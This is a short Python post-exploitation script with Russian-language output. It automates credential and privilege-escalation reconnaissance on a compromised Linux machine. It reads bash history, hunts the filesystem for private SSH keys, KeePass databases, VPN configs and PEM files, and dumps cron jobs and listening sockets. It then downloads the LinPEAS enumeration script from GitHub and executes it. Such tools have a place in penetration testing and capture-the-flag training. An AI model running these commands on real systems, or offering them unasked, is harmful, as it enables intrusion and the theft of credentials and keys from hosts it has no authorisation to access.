import subprocess

def run_command(command, description=None):
    print(f"\n[+] {description or command}")
    try:
        result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.DEVNULL)
        print(result.strip())
    except subprocess.CalledProcessError:
        print("[-] Ошибка или доступа нет.")

def run():
    print("\n[*] Post Exploitation Quick Tips (Автоматический режим):")

    # Home dirs for creds
    run_command("ls -la /home/*", "Список файлов в /home/")
    run_command("cat ~/.bash_history", "История bash (если есть доступ)")
    run_command("find / -name '*.kdbx' -o -name '*.ovpn' -o -name '*.pem'", "Поиск файлов .kdbx, .ovpn, .pem")

    # SSH Keys
    run_command("find / -name id_rsa", "Поиск приватных SSH-ключей")

    # Cron Jobs
    run_command("cat /etc/crontab", "Планировщик cron (/etc/crontab)")

    # Netstat / ss
    run_command("ss -tunlp", "Активные сетевые соединения")

    # LinPEAS
    print("\n[+] Загружаем и запускаем LinPEAS:")
    try:
        subprocess.run("wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh", shell=True, check=True)
        subprocess.run("chmod +x linpeas.sh", shell=True)
        subprocess.run("./linpeas.sh", shell=True)
    except subprocess.CalledProcessError:
        print("[-] Ошибка при загрузке или запуске linpeas.sh")

    print("\n[+] Для мониторинга процессов скачай pspy отсюда:")
    print("https://github.com/DominicBreuker/pspy/releases")
    print("Затем запусти: ./pspy64")
